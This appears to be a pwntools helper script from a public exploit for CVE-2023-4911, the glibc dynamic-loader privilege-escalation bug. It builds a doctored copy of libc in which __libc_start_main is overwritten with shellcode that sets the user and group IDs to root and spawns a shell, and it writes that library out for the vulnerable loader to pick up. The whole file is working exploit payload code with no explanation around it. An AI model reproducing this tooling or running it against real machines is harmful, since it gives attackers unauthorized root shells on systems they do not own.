#!/usr/bin/env python3
# reference: https://github.com/leesh3288/CVE-2023-4911/blob/main/gen_libc.py
from pwn import *

context(os = 'linux', arch = 'amd64')

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
ofs_libc_main = libc.sym['__libc_start_main']

def main(path: str):
    libc_raw = bytearray(open(libc.path, 'rb').read())

    shellasm  = shellcraft.setuid(0)
    shellasm += shellcraft.setgid(0)
    shellasm += shellcraft.sh()
    shellasm += shellcraft.exit(-1)
    shellcode = asm(shellasm)

    libc_raw[ofs_libc_main : ofs_libc_main + len(shellcode)] = shellcode

    if not os.path.isdir(path):
        os.mkdir(path)
    open('{}/libc.so.6'.format(path), 'wb').write(libc_raw)

if __name__ == '__main__':
    main(args.PATH if args.PATH else '.')
